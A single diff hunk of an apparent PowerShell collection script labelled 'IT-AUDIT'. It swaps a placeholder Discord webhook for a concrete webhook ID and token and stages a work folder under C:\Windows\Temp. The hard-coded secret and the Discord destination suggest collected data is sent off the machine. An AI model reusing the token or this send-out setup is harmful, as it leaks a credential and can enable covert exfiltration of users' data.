@@ -12,7 +12,7 @@
 # ============================================
 
 # Configuration
-$DiscordWebhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+$DiscordWebhook = "https://discord.com/api/webhooks/1459071758568259739/41IVLdpdgqRfFbSWRKWwBJkXqdMylVP8KIYXIO0YIMS3Db3vM2S3R-TPzRz2UYuLh6Pl"
 $CollectionID = "IT-AUDIT-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 $WorkDir = "C:\Windows\Temp\$CollectionID"
 New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
